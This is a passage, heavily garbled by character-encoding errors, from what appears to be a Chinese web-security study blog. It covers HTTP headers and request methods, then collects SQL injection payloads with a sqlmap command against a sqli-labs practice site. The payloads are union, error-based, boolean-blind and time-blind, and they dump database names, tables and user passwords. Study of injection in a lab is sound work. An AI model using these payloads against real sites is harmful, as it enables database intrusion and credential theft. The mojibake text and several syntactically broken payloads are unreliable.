ä»£è¡¨ä¸ç¼“å­˜è¿‡æœŸçš„èµ„æºï¼Œç¼“å­˜ä¼šå‘æºæœåŠ¡å™¨è¿›è¡Œæœ‰æ•ˆæœŸç¡®è®¤åå¤„ç†èµ„æºï¼Œä¹Ÿè®¸ç§°ä¸º do-notserve-from-cache-without-revalidation æ›´åˆé€‚ï¼Œno-store æ‰æ˜¯çœŸæ­£åœ°ä¸è¿›è¡Œç¼“å­˜ã€‚ Connectionå­—æ®µ å…·å¤‡ä¸¤ä¸ªä½œç”¨ï¼š æ§åˆ¶ä¸å†è½¬å‘ç»™ä»£ç†çš„é¦–éƒ¨å­—æ®µ conneciton: upgradeè¡¨ç¤ºUpgradeé¦–éƒ¨å­—æ®µäº§ç”Ÿä½œç”¨çš„Upgradeå¯¹è±¡ä»…é™äºå®¢æˆ·ç«¯å’Œé‚»æ¥æœåŠ¡å™¨ä¹‹é—´ã€‚ ç®¡ç†æŒä¹…è¿æ¥ HTTP/1.1 ç‰ˆæœ¬çš„é»˜è®¤è¿æ¥éƒ½æ˜¯æŒä¹…è¿æ¥ã€‚ä¸ºæ­¤ï¼Œå®¢æˆ·ç«¯ä¼šåœ¨æŒä¹…è¿æ¥ä¸Šè¿ç»­å‘é€è¯·æ±‚ã€‚å½“æœåŠ¡å™¨ç«¯æƒ³æ˜ç¡®æ–­å¼€è¿æ¥æ—¶ï¼Œåˆ™æŒ‡å®š Connection é¦–éƒ¨å­—æ®µçš„å€¼ä¸º Closeã€‚ Dateå­—æ®µ é¦–éƒ¨å­—æ®µ Date è¡¨æ˜åˆ›å»º HTTP æŠ¥æ–‡çš„æ—¥æœŸå’Œæ—¶é—´ã€‚ Transfer-Encodingå­—æ®µ é¦–éƒ¨å­—æ®µ Transfer-Encoding è§„å®šäº†ä¼ è¾“æŠ¥æ–‡ä¸»ä½“æ—¶é‡‡ç”¨çš„ç¼–ç æ–¹å¼ã€‚ Upgradeå­—æ®µ é¦–éƒ¨å­—æ®µ Upgrade ç”¨äºæ£€æµ‹ HTTP åè®®åŠå…¶ä»–åè®®æ˜¯å¦å¯ä½¿ç”¨æ›´é«˜çš„ ç‰ˆæœ¬è¿›è¡Œé€šä¿¡ï¼Œå…¶å‚æ•°å€¼å¯ä»¥ç”¨æ¥æŒ‡å®šä¸€ä¸ªå®Œå…¨ä¸åŒçš„é€šä¿¡åè®®ã€‚ Viaå­—æ®µ ä½¿ç”¨é¦–éƒ¨å­—æ®µ Via æ˜¯ä¸ºäº†è¿½è¸ªå®¢æˆ·ç«¯ä¸æœåŠ¡å™¨ä¹‹é—´çš„è¯·æ±‚å’Œå“åº”æŠ¥æ–‡çš„ä¼ è¾“è·¯å¾„ã€‚ è¯·æ±‚é¦–éƒ¨å­—æ®µï¼ˆRequest Header Fieldsï¼‰ ä»å®¢æˆ·ç«¯å‘æœåŠ¡å™¨ç«¯å‘é€è¯·æ±‚æŠ¥æ–‡æ—¶ä½¿ç”¨çš„é¦–éƒ¨ã€‚è¡¥å……äº†è¯·æ±‚çš„é™„åŠ å†…å®¹ã€å®¢æˆ·ç«¯ä¿¡æ¯ã€å“åº”å†…å®¹ç›¸å…³ä¼˜å…ˆçº§ç­‰ä¿¡æ¯ã€‚ é¦–éƒ¨å­—æ®µå è¯´æ˜ Accept ç”¨æˆ·ç†å¯å¤„ç†çš„åª’ä½“ç±»å‹ Accept-Charset ä¼˜å…ˆçš„å­—ç¬¦é›† Accept-Encoding ä¼˜å…ˆçš„å†…å®¹ç¼–ç  Accept-Language ä¼˜å…ˆçš„è¯­è¨€ Authorization Webè®¤è¯ä¿¡æ¯ Expect æœŸå¾…æœåŠ¡å™¨çš„ç‰¹å®šè¡Œä¸º From ç”¨æˆ·çš„ç”µå­é‚®ç®± Host è¯·æ±‚èµ„æºæ‰€åœ¨çš„æœåŠ¡å™¨ If-Match æ¯”è¾ƒå®ä½“æ ‡å¿—ï¼ˆETagï¼‰ If-None-Match æ¯”è¾ƒå®ä½“æ ‡å¿—ï¼ˆETagï¼‰ If-Modified-Since æ¯”è¾ƒèµ„æºæ›´æ–°æ—¶é—´ If-Range èµ„æºæœªæ›´æ–°æ—¶å‘é€å®ä½“Byteçš„èŒƒå›´è¯·æ±‚ If-Unmodified-Since æ¯”è¾ƒèµ„æºæ›´æ–°æ—¶é—´ï¼ˆä¸If-Modified-Sinceç›¸åï¼‰ Max-Forward æœ€å¤§ä¼ è¾“é€è·³æ•° Proxy-Authorization ä»£ç†æœåŠ¡å™¨è¦æ±‚å®¢â¼¾ç«¯çš„è®¤è¯ä¿¡æ¯ Referer å¯¹è¯·æ±‚ä¸­URIçš„åŸå§‹è·å–æ–¹ TE ä¼ è¾“ç¼–ç çš„ä¼˜å…ˆçº§ User-Agent HTTPå®¢æˆ·ç«¯ç¨‹åºä¿¡æ¯ å“åº”é¦–éƒ¨å­—æ®µï¼ˆResponse Header Fieldsï¼‰ ä»æœåŠ¡å™¨ç«¯å‘å®¢æˆ·ç«¯è¿”å›å“åº”æŠ¥æ–‡æ—¶ä½¿ç”¨çš„é¦–éƒ¨ã€‚è¡¥å……äº†å“åº”çš„é™„åŠ å†…å®¹ï¼Œä¹Ÿä¼šè¦æ±‚å®¢æˆ·ç«¯é™„åŠ é¢å¤–çš„å†…å®¹ä¿¡æ¯ã€‚ é¦–éƒ¨å­—æ®µ è¯´æ˜ Accept-Ranges æ˜¯å¦æ¥å—å­—æ®µèŒƒå›´è¯·æ±‚ Age æ¨ç®—èµ„æºåˆ›å»ºç»è¿‡æ—¶é—´ ETag èµ„æºåŒ¹é…ä¿¡æ¯ Location ä»¤å®¢æˆ·ç«¯é‡å®šå‘è‡³æŒ‡å®šURI Proxy-Authenticate ä»£ç†æœåŠ¡å™¨å¯¹å®¢æˆ·ç«¯çš„è®¤è¯ä¿¡æ¯ Retry-After å¯¹å†æ¬¡å‘èµ·è¯·æ±‚çš„æ—¶æœºè¦æ±‚ Server HTTPæœåŠ¡å™¨çš„å®‰è£…ä¿¡æ¯ Vary ä»£ç†æœåŠ¡å™¨ç¼“å­˜çš„ç®¡ç†ä¿¡æ¯ WWW-Authenticate æœåŠ¡å™¨å¯¹å®¢æˆ·ç«¯çš„è®¤è¯ä¿¡æ¯ å®ä½“é¦–éƒ¨å­—æ®µï¼ˆEntity Header Fieldsï¼‰ é’ˆå¯¹è¯·æ±‚æŠ¥æ–‡å’Œå“åº”æŠ¥æ–‡çš„å®ä½“éƒ¨åˆ†ä½¿ç”¨çš„é¦–éƒ¨ã€‚è¡¥å……äº†èµ„æºå†…å®¹æ›´æ–°æ—¶é—´ç­‰ä¸å®ä½“æœ‰å…³çš„ä¿¡æ¯ã€‚ é¦–éƒ¨å­—æ®µå è¯´æ˜ Allow å¯æ”¯æŒçš„HTTPæ–¹æ³• Content-Encoding å®ä½“ä¸»ä½“é€‚ç”¨çš„ç¼–ç æ–¹å¼ Content-Laguage å®ä½“ä¸»è‹±æ–‡åç§°ä½“çš„è‡ªç„¶è¯­è¨€ Content-Length å®ä½“ä¸»ä½“çš„å¤§å° Content-Location æ›¿ä»£å¯¹åº”èµ„æºçš„URI Content-MD5 å®ä½“ä¸»ä½“çš„æ‘˜è¦ Content-Type å®ä½“ä¸»ä½“çš„åª’ä½“ç±»å‹ Content-Range å®ä½“ä¸»ä½“çš„ä½ç½®èŒƒå›´ Expires å®ä½“ä¸»ä½“è¿‡æœŸçš„æ—¥æœŸæ—¶é—´ Last-Modied èµ„æºæœ€åä¿®æ”¹çš„æ—¥æœŸæ—¶é—´ 0x04 HTTPè¯·æ±‚æ–¹æ³•åŠè¿”å›çŠ¶æ€ç çš„ç±»å‹å’Œå«ä¹‰ HTTPè¯·æ±‚æ–¹æ³• HTTPè¯·æ±‚æ–¹å¼åˆ†ä¸ºGET ã€POST ã€PUT ã€HEAD ã€DELETE ã€OPTIONS ã€TRACEå’ŒCONNECT å…«ç§ã€‚ GETï¼šè·å–èµ„æº GET æ–¹æ³•ç”¨æ¥è¯·æ±‚è®¿é—®å·²è¢«URI è¯†åˆ«çš„èµ„æºã€‚æŒ‡å®šçš„èµ„æºç»æœåŠ¡å™¨ç«¯è§£æåè¿”å›å“åº”å†…å®¹ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œå¦‚æœè¯·æ±‚çš„èµ„æºæ˜¯æ–‡æœ¬ï¼Œé‚£å°±ä¿æŒåŸæ ·è¿”å›ï¼›å¦‚æœæ˜¯åƒCGIï¼ˆCommon Gateway Interfaceï¼Œé€šç”¨ç½‘å…³æ¥å£ï¼‰é‚£æ ·çš„ç¨‹åºï¼Œåˆ™è¿”å›ç»è¿‡æ‰§è¡Œåçš„è¾“å‡ºç»“æœã€‚ä¾‹å¦‚ï¼š POSTï¼šä¼ è¾“å®ä½“ä¸»ä½“ POST æ–¹æ³•ç”¨æ¥ä¼ è¾“å®ä½“çš„ä¸»ä½“ã€‚ è™½ç„¶ç”¨GET æ–¹æ³•ä¹Ÿå¯ä»¥ä¼ è¾“å®ä½“çš„ä¸»ä½“ï¼Œä½†â¼€èˆ¬ä¸ç”¨GET æ–¹æ³•è¿›è¡Œä¼ è¾“ï¼Œè€Œæ˜¯ç”¨POST æ–¹æ³•ã€‚è™½è¯´POST çš„åŠŸèƒ½ä¸GET å¾ˆç›¸ä¼¼ï¼Œä½†POST çš„ä¸»è¦ç›®çš„å¹¶ä¸æ˜¯è·å–å“åº”çš„ä¸»ä½“å†…å®¹ã€‚ä¾‹å¦‚ï¼š PUTï¼šä¼ è¾“æ–‡ä»¶ PUT æ–¹æ³•ç”¨æ¥ä¼ è¾“æ–‡ä»¶ã€‚å°±åƒFTPåè®®çš„æ–‡ä»¶ä¸Šä¼ â¼€æ ·ï¼Œè¦æ±‚è¯·æ±‚æŠ¥æ–‡çš„ä¸»é¢˜ä¸­åŒ…å«æ–‡ä»¶å†…å®¹ï¼Œç„¶åä¿å­˜åˆ°è¯·æ±‚URIçš„ä½ç½®ã€‚ä½†æ˜¯ï¼Œé‰´äºHTTP/1.1çš„PUT æ–¹æ³•è‡ªèº«ä¸å¸¦éªŒè¯æœºåˆ¶ï¼Œä»»ä½•â¼ˆéƒ½å¯ä»¥ä¸Šä¼ æ–‡ä»¶ï¼Œå­˜åœ¨å®‰å…¨æ€§é—®é¢˜ï¼Œå› æ­¤â¼€èˆ¬çš„Webç½‘ç«™ä¸ä½¿ç”¨è¯¥æ–¹æ³•ã€‚ä¾‹å¦‚ï¼š HEADï¼šè·å–æŠ¥æ–‡é¦–éƒ¨ HEAD æ–¹æ³•å’ŒGETæ–¹æ³•â¼€æ ·ï¼Œåªæ˜¯ä¸è¿”å›æŠ¥æ–‡ä¸»ä½“éƒ¨åˆ†ã€‚å‹‡äºç¡®è®¤URI çš„æœ‰æ•ˆæ€§åŠèµ„æºæ›´æ–°çš„æ—¥æœŸæ—¶é—´ç­‰ã€‚ä¾‹å¦‚ï¼š DELETEï¼šåˆ é™¤æ–‡ä»¶ DELETE æ–¹æ³•ç”¨æ¥åˆ é™¤æ–‡ä»¶ï¼Œæ˜¯ä¸PUT ç›¸åçš„æ–¹æ³•ã€‚DELETEæ–¹æ³•æŒ‰è¯·æ±‚URI åˆ é™¤æŒ‡å®šçš„èµ„æºã€‚ä¾‹å¦‚ï¼š OPTIONSï¼šè¯¢é—®æ”¯æŒæ–¹æ³• OPTIONSæ–¹æ³•ç”¨æ¥æŸ¥è¯¢é’ˆå¯¹è¯·æ±‚URI æŒ‡å®šçš„èµ„æºæ”¯æŒçš„æ–¹æ³•ã€‚ä¾‹å¦‚ï¼š TRACEï¼šè¿½è¸ªè·¯å¾„ TRACEæ–¹æ³•æ˜¯è®© Web æœåŠ¡å™¨ç«¯å°†ä¹‹å‰çš„è¯·æ±‚é€šä¿¡ç¯å›ç»™å®¢æˆ·ç«¯çš„æ–¹æ³•ã€‚ å‘é€è¯·æ±‚æ—¶,åœ¨ Max-Forwards é¦–éƒ¨å­—æ®µä¸­å¡«å…¥æ•°å€¼,æ¯ç»è¿‡ä¸€ä¸ªæœåŠ¡å™¨ç«¯å°±å°†è¯¥æ•°å­—å‡ 1 ,å½“æ•°å€¼åˆšå¥½å‡åˆ° 0 æ—¶,å°±åœæ­¢ç»§ç»­ä¼ è¾“,æœ€åæ¥æ”¶åˆ°è¯·æ±‚çš„æœåŠ¡å™¨ç«¯åˆ™è¿”å›çŠ¶æ€ç  200 OK çš„å“åº”ã€‚ ä½†æ˜¯,TRACE æ–¹æ³•æœ¬æ¥å°±ä¸æ€ä¹ˆå¸¸ç”¨,å†åŠ ä¸Šå®ƒå®¹æ˜“å¼•å‘XST(Cross-Site Tracing,è·¨ç«™è¿½è¸ª) æ”»å‡»,é€šå¸¸å°±æ›´ä¸ä¼šç”¨åˆ°äº†ã€‚ CONNECTï¼šéš§é“åè®®è¿æ¥ä»£ç†","tags":[{"name":"webå®‰å…¨åŸºç¡€","slug":"webå®‰å…¨åŸºç¡€","permalink":"http://ca0y1h.top/tags/web%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/"},{"name":"HTTPåè®®","slug":"HTTPåè®®","permalink":"http://ca0y1h.top/tags/HTTP%E5%8D%8F%E8%AE%AE/"}],"categories":[{"name":"webå®‰å…¨","slug":"webå®‰å…¨","permalink":"http://ca0y1h.top/categories/web%E5%AE%89%E5%85%A8/"},{"name":"åŸºç¡€å­¦ä¹ ","slug":"webå®‰å…¨/åŸºç¡€å­¦ä¹ ","permalink":"http://ca0y1h.top/categories/web%E5%AE%89%E5%85%A8/%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0/"}]},{"title":"Webå®‰å…¨å­¦ä¹ ä¹‹æ•°æ®åº“æ³¨å…¥è¯­å¥çš„æ”¶é›†å’Œå­¦ä¹ ","date":"2019-10-01T08:22:28.000Z","path":"Web_security/basic_learning/5.æ•°æ®åº“æ³¨å…¥è¯­å¥çš„æ”¶é›†å’Œå­¦ä¹ /","text":"Webå®‰å…¨å­¦ä¹ ä¹‹æ•°æ®åº“æ³¨å…¥è¯­å¥çš„æ”¶é›†å’Œå­¦ä¹  ä»»åŠ¡ç›®æ ‡ æ”¶é›†ç½‘ç»œä¸Šå„ç§sqlæ³¨å…¥æ—¶ä½¿ç”¨çš„payloadå¹¶ç†è§£å…¶é€‚ç”¨çš„ç¯å¢ƒï¼ˆæ£€æµ‹æ³¨å…¥ã€åˆ©ç”¨æ³¨å…¥ï¼‰ï¼› è®°å½•sqlmapçš„æ£€æµ‹å’Œåˆ©ç”¨è¿‡ç¨‹ä¸­ä½¿ç”¨çš„payloadï¼› ç†è§£ä»¥ä¸Šæ¶‰åŠçš„sqlè¯­å¥çš„æ„æ€ï¼Œå…¶ä¸­ä¼šæ¶‰åŠä¸åŒçš„æ•°æ®åº“ã€ä¸åŒæ³¨å…¥åœºæ™¯ã€‚å°†æ”¶é›†æ–¹å¼å’Œå­¦ä¹ è¿‡ç¨‹æ•´ç†å½¢æˆæŠ¥å‘Šï¼› æ‰©å±•å­¦ä¹ ï¼šç†è§£sqlmapè‡ªå¸¦tamperçš„åŸç† 0x01 Payloadæ”¶é›† ä»¥ä¸‹payloadséƒ½åŸºäºå•å¼•å·å­—ç¬¦å‹æ³¨å…¥ã€‚è‹¥æ˜¯æ•´å‹æ³¨å…¥åˆ™æŠŠå•å¼•å·å’Œæ³¨é‡Šç¬¦ï¼ˆâ€“+ï¼‰å»æ‰ï¼Œè‹¥æ˜¯åŒå¼•å·æ³¨å…¥åˆ™æŠŠå•å¼•å·æ¢æˆåŒå¼•å·ã€‚ æˆ‘ä»¬æŠŠæ³¨å…¥åœºæ™¯åˆ†ä¸ºï¼š è”åˆæŸ¥è¯¢æ³¨å…¥ æŠ¥é”™å‹æ³¨å…¥ å¸ƒå°”ç›²æ³¨ æ—¶é—´ç›²æ³¨ è”åˆæŸ¥è¯¢æ³¨å…¥ ä½¿ç”¨åœºæ™¯ é¡µé¢ä¸Šæœ‰æ˜¾ç¤ºä½ ä»€ä¹ˆæ˜¯æ˜¾ç¤ºä½ï¼š åœ¨ä¸€ä¸ªåœ¨ä¸€ä¸ªç½‘ç«™çš„æ­£å¸¸é¡µé¢ï¼ŒæœåŠ¡ç«¯æ‰§è¡ŒSQLè¯­å¥æŸ¥è¯¢æ•°æ®åº“ä¸­çš„æ•°æ®ï¼Œå®¢æˆ·ç«¯å°†æ•° æ®å±•ç¤ºåœ¨é¡µé¢ä¸­ï¼Œè¿™ä¸ªå±•ç¤ºæ•°æ®çš„ä½ç½®å°±å«æ˜¾ç¤ºä½ ã€‚ Payload åˆ¤æ–­å½“å‰æ•°æ®è¡¨ä¸­æœ‰å‡ åˆ—ï¼š 1?id&#x3D;1&#39; order by æ•°å€¼ --+ æŸ¥çœ‹æ˜¾ç¤ºä½åœ¨ç¬¬å‡ åˆ—ï¼ˆå‡è®¾ä¸€å…±ä¸‰åˆ—ï¼‰ï¼š 1?id&#x3D;-1&#39; union select 1,2,3 --+ æ³¨æ„ï¼šè¿™é‡Œå¿…é¡»æ˜¯æŸ¥è¯¢ä¸€ä¸ªä¸å­˜åœ¨çš„è®°å½•æ‰èƒ½èµ·ä½œç”¨ã€‚ æ˜¾ç¤ºå½“å‰æ•°æ®åº“ï¼ˆå‡è®¾æ˜¾ç¤ºä½ä¸­åŒ…å«ç¬¬ä¸‰ä½ï¼‰ï¼š 1?id&#x3D;-1&#39; union select 1,2,database() --+ æŸ¥çœ‹å½“å‰æ•°æ®åº“ä¸­çš„æ‰€æœ‰è¡¨ï¼š 1?id&#x3D;-1&#39; union select 1,2,(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()) --+ å‡½æ•°group_concat()æŠŠæ‰€æœ‰ç»“æœéƒ½åœ¨ä¸€è¡Œè¾“å‡º æŸ¥è¯¢æ‰€æœ‰æ•°æ®åº“ï¼š 1?id&#x3D;-1&#39; union select 1,2,(select group_concat(schema_name) from information_schema.schema) --+ æŸ¥è¯¢æŸä¸ªæ•°æ®åº“ä¸­çš„è¡¨ï¼š 1?id&#x3D;-1&#39; union select 1,2,(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;&#39;security&#39; --+ æŸ¥è¯¢æŸä¸ªè¡¨ä¸­çš„æ‰€æœ‰å­—æ®µï¼š 1?id&#x3D;-1&#39; union select 1,2,(select group_concat(column_name) from information_schema.columns where table_schema&#x3D;&#39;security&#39; and table_name&#x3D;&#39;users&#39; --+ æŸ¥è¯¢æŸä¸ªè¡¨ä¸­çš„å­—æ®µå†…å®¹ 1?id&#x3D;-1&#39; union select 1,2,(select group_concat(name, 0x3a, passwd) from security.users) 0x3aä¼šè¢«è½¬ä¹‰ä½å†’å·ï¼š æŠ¥é”™å‹æ³¨å…¥ ä½¿ç”¨åœºæ™¯ é¡µé¢ä¸Šæ²¡æœ‰æ˜¾ç¤ºä½ä½†æ˜¯æœ‰sqlè¯­å¥æ‰§è¡Œé”™è¯¯ä¿¡æ¯è¾“å‡ºã€‚ Payload ä¸»è¦æœ‰ä¸‰ç§SQLæ³¨å…¥æŠ¥é”™æ–¹å¼ï¼š ExtractValue UpdateXml floor ExtractValue é¦–å…ˆæ¥çœ‹ExtractValue()å‡½æ•°ï¼Œå®ƒæ¥å—ä¸¤ä¸ªå­—ç¬¦ä¸²å‚æ•°ï¼Œç¬¬ä¸€ä¸ªå‚æ•°å¯ä»¥ä¼ å…¥ç›®æ ‡xmlæ–‡æ¡£ï¼Œç¬¬äºŒä¸ªå‚æ•°æ˜¯ç”¨Xpathè·¯å¾„æ³•è¡¨ç¤ºçš„æŸ¥æ‰¾è·¯å¾„ã€‚è¿™é‡Œå¦‚æœXpathæ ¼å¼è¯­æ³•ä¹¦å†™é”™è¯¯çš„è¯ï¼Œå°±ä¼šæŠ¥é”™ã€‚è¿™é‡Œå°±æ˜¯åˆ©ç”¨è¿™ä¸ªç‰¹æ€§æ¥è·å¾—æˆ‘ä»¬æƒ³è¦çŸ¥é“çš„å†…å®¹ã€‚ ä¾‹å¦‚ï¼š 12mysql&gt; select ExtractValue(&#39;&lt;a&gt;&lt;b&gt;&lt;b&#x2F;&gt;&lt;&#x2F;a&gt;&#39;, &#39;~&#39;);ERROR 1105 (HY000): XPATH syntax error: &#39;~&#39; åˆ©ç”¨concatå‡½æ•°å°†æƒ³è¦è·å¾—çš„æ•°æ®åº“å†…å®¹æ‹¼æ¥åˆ°ç¬¬äºŒä¸ªå‚æ•°ä¸­ï¼ŒæŠ¥é”™æ—¶ä½œä¸ºå†…å®¹è¾“å‡ºã€‚ 12mysql&gt; select ExtractValue(&#39;&lt;a&gt;&lt;b&gt;&lt;b&#x2F;&gt;&lt;&#x2F;a&gt;&#39;, concat(&#39;~&#39;, (select database())));ERROR 1105 (HY000): XPATH syntax error: &#39;~security&#39; UpdateXml UpdateXML(xml_target, xpath_expr, new_xml) xml_target:ï¼š éœ€è¦æ“ä½œçš„xmlç‰‡æ®µ xpath_exprï¼š éœ€è¦æ›´æ–°çš„xmlè·¯å¾„(Xpathæ ¼å¼) new_xmlï¼š æ›´æ–°åçš„å†…å®¹ ä¸è¿‡è¿™äº›å‚æ•°éƒ½ä¸å¤ªé‡è¦ï¼Œè¿™é‡Œå’Œä¸Šé¢çš„extractvalueå‡½æ•°ä¸€æ ·ï¼Œå½“Xpathè·¯å¾„è¯­æ³•é”™è¯¯æ—¶ï¼Œå°±ä¼šæŠ¥é”™ï¼ŒæŠ¥é”™å†…å®¹å«æœ‰é”™è¯¯çš„è·¯å¾„å†…å®¹ï¼š 12345mysql&gt; select updatexml(&#39;test&#39;, concat(&#39;~&#39;, (select database())), &#39;test&#39;);ERROR 1105 (HY000): XPATH syntax error: &#39;~security&#39;mysql&gt; select updatexml(&#39;test&#39;, concat(&#39;~&#39;, (select version())), &#39;test&#39;);ERROR 1105 (HY000): XPATH syntax error: &#39;~5.7.27-0ubuntu0.18.0.1&#39; Floor æœ‰å…³floor()å‡½æ•°çš„æ³¨å…¥åŸç†å¯ä»¥çœ‹è¿™ç¯‡æ–‡ç« ã€‚ å›ºå®šæ ¼å¼ï¼š 1?id&#x3D;-1&#39; union select 1, count(*), concat((******), floor(rand()*2))as a from information_schema.tables group by a --+ ******æ›¿æ¢ä¸ºæŸ¥è¯¢è¯­å¥å³å¯ã€‚ æŸ¥è¯¢æ•°æ®åº“ 1?id&#x3D;-1&#39; union select 1, count(*), concat((select database()), floor(rand()*2)) as a from information_schema.tables group by a --+ æŸ¥è¯¢æŸä¸ªæ•°æ®åº“ä¸­çš„è¡¨ 1?id&#x3D;-1&#39; union select 1,count(*), concat((select table_name from information_schema.tables where table_schema&#x3D;&#39;security&#39; limit 1, 1), floor(rand()*2)) as a from information_schema.columns group by a --+ æŸ¥è¯¢è¡¨ä¸­çš„å­—æ®µ 1?id&#x3D;-1&#39; union select 1, count(*), concat((select column_name from information_schema.columns where table_schema&#x3D;&#39;security&#39; and table_name&#x3D;&#39;users&#39;, limit 1,1), floor(rand()*2)) as a from information_schema.columns group by a --+ æŸ¥è¯¢è¡¨ä¸­çš„å­—æ®µå†…å®¹ 1?id&#x3D;-1&#39; union select 1,count(*), concat((select concat_ws(&#39;|&#39;,username,password) from security.users limit 1,1), floor(rand()*2))as a from information_schema.tables group by a --+ ä¿®æ”¹limit x,1 å¯ä»¥æ˜¾ç¤ºç¬¬xä¸ªç”¨æˆ·çš„passwordå’Œusernameã€‚ å¸ƒå°”ç›²æ³¨ ä½¿ç”¨åœºæ™¯ é¡µé¢æ²¡æœ‰æ˜¾ç¤ºä½ï¼Œä¹Ÿæ²¡æœ‰SQLè¯­å¥æ‰§è¡Œé”™è¯¯ä¿¡æ¯ï¼Œåªèƒ½é€šè¿‡é¡µé¢è¿”å›æ˜¯å¦æ­£å¸¸æ¥åˆ¤æ–­æ³¨å…¥ç‚¹ã€‚ Payload æœ‰ç”¨åˆ°äºŒåˆ†æ³•çš„æ€æƒ³ æ•°æ®åº“åç›¸å…³ æŸ¥è¯¢æ•°æ®åº“ä¸ªæ•° 1?id&#x3D;1&#39; union (select count(schema_name) from information_schema.schemata) &lt; 77 --+ æŸ¥è¯¢æŸä¸€ä¸ªæ•°æ®åº“åçš„é•¿åº¦ 1?id&#x3D;1&#39; union (select length(schema_name) from information_schema.schemata limit 1,1) &lt; 77 --+ æŸ¥è¯¢æŸä¸ªæ•°æ®åº“å 1?id&#x3D;1&#39; union (select assii(substr(select schema_name from information_schema.schema limit 1,1)1,1)) &lt; 77 --+ æ•°æ®è¡¨ç›¸å…³ æŸ¥è¯¢è¡¨çš„ä¸ªæ•° 1?id&#x3D;1&#39; union (select count(table_name) from information_schema.tables where table_schema&#x3D;&#39;security&#39;) &lt; 77 --+ æŸ¥è¯¢è¡¨çš„é•¿åº¦ 1?id&#x3D;1&#39; union (select length(table_name) from information.schema.tables where table_schema&#x3D;&#39;security&#39;) &lt; 77 --+ æŸ¥çœ‹æŸä¸ªè¡¨å 1?id&#x3D;1&#39; union (select ascii(substr((select table_name from information_schema.tables where table_schema&#x3D;&#39;security&#39; limit 1,1),1,1))) &lt; 77 --+ å­—æ®µç›¸å…³ æŸ¥çœ‹æŸä¸ªè¡¨ä¸­çš„å­—æ®µä¸ªæ•° 1?id&#x3D;1&#39; union (select count(column_name) from information_schema.columns where table_schema&#x3D;&#39;security&#39; and table_name&#x3D;&#39;users&#39;) &lt; 77 --+ æŸ¥çœ‹æŸä¸ªå­—æ®µåçš„é•¿åº¦ 1?id&#x3D;1&#39; union (select length(column_name) from infomation_schema.columns where table_schema&#x3D;&#39;security&#39; and table_name&#x3D;&#39;users&#39; limit 1,1) &lt; 77 --+ æŸ¥çœ‹æŸä¸ªå­—æ®µå 1?id&#x3D;1&#39; union (select ascii(substr((select column_name from information_schema.columns where table_schema&#x3D;&#39;security&#39; and table_name&#x3D;&#39;users&#39; limit 1,1),1,1))) &lt; 77 --+ è®°å½•å†…å®¹ç›¸å…³ æŸ¥çœ‹è¡¨ä¸­è¡Œæ•° 1?id&#x3D;1&#39; union (select count(*) from security.users) &lt; 77 --+ æŸ¥çœ‹æŸä¸ªå­—æ®µå†…å®¹çš„é•¿åº¦ 1?id&#x3D;1&#39; union (select length(username) from security.users limit 1,1) &lt; 77 --+ æŸ¥çœ‹æŸä¸ªå­—æ®µçš„å†…å®¹ 1?id&#x3D;1&#39; union (select ascii(substr((select username from security.users limit 1,1),1,1))) &lt; 77 --+ æ—¶é—´ç›²æ³¨ ä½¿ç”¨åœºæ™¯ é¡µé¢ä¸Šæ²¡æœ‰æ˜¾ç¤ºä½ï¼Œä¹Ÿæ²¡æœ‰è¾“å‡ºSQLè¯­å¥æ‰§è¡Œé”™è¯¯ä¿¡æ¯ã€‚æ­£ç¡®çš„SQLè¯­å¥å’Œé”™è¯¯çš„SQLè¯­å¥è¿”å›é¡µé¢éƒ½ä¸€æ ·ï¼Œä½†æ˜¯åŠ å…¥sleep(5)æ¡ä»¶ä¹‹åï¼Œå¦‚æœifæ¡ä»¶æˆç«‹åˆ™é¡µé¢çš„è¿”å›é€Ÿåº¦æ˜æ˜¾æ…¢äº†5ç§’ã€‚ Payload ä¸å¸ƒå°”ç›²æ³¨çš„æ€æƒ³ç±»ä¼¼ åˆ¤æ–­æ•°æ®åº“çš„ä¸ªæ•° 1id&#x3D;1&#39; and if((select count(schema_name) from information_schema.schemata)&#x3D;9, sleep(5), 1) --+ åˆ¤æ–­æ•°æ®åº“åçš„é•¿åº¦ 1id&#x3D;1&#39; and if((select length(schema_name) from information_schema.schemata)&#x3D;9, sleep(5), 1) --+ æŸ¥è¯¢æ•°æ®åº“å 1id&#x3D;1&#39; and if((select ascii(substr((select schema_name from information_schema.schemata limit 0,1)1,1)))&#x3D;105, sleep(5), 1) --+ 0x02 SQLMap Payload ä»¥sqlilabä¸­çš„Less-8ä¸ºä¾‹ï¼ˆå¸ƒå°”å‹å•å¼•å·GETç›²æ³¨ï¼‰ï¼ŒæŸ¥çœ‹sqlmapä¸­ä½¿ç”¨çš„payloadsï¼Œæ‰§è¡Œå‘½ä»¤ï¼š 1python sqlmap.py -v 3 -u &quot;http://localhost/sqlilabs/Less-8/?id=1&quot; --dbs --dbms=&quot;MySQL&quot; é¦–å…ˆè·å–æ•°æ®åº“çš„ä¸ªæ•°ï¼šå‡½æ•°è§£é‡Šï¼š ORD(string) ï¼šè¿”å›å­—ç¬¦ä¸²é¦–å­—ç¬¦çš„ASCIIç å€¼ã€‚ MID(stringï¼Œstartï¼Œlength) ï¼šè¿”å›å­—ç¬¦ä¸²çš„ä»startå¼€å§‹é•¿åº¦ä¸ºlengthçš„å­—ç¬¦ä¸²ã€‚ IFNULL(string1ï¼Œstring2) ï¼šå¦‚æœstring1æ˜¯NULLåˆ™è¿”å›string2ï¼Œå¦‚æœä¸æ˜¯NULLè¿”å›string1ã€‚ CAST(volume as type) ç”¨äºæ•°æ®ç±»å‹è½¬æ¢ï¼Œå°†volumeè½¬æ¢æˆtypeç±»å‹çš„æ•°æ®ï¼ˆå¦‚è¿™é‡Œæ˜¯å°†æ•°å­—è½¬ æ¢ä¸ºå­—ç¬¦ä¸²ï¼‰ã€‚ COUNT()ï¼š ç»Ÿè®¡ä¸ªæ•°ã€‚ DISTINCT()ï¼š æ ‡è®°åªè¦ä¸åŒï¼ˆå”¯ä¸€ï¼‰çš„å€¼ã€‚ Payloadè§£é‡Šï¼š 0-9çš„å­—ç¬¦ASCIIå€¼å¯¹åº”çš„æ˜¯48-57ï¼Œæ‰€ä»¥sqlmapé¦–å…ˆåˆ¤æ–­çš„&gt;51ä¹Ÿå°±æ˜¯&gt;3ï¼Œå› 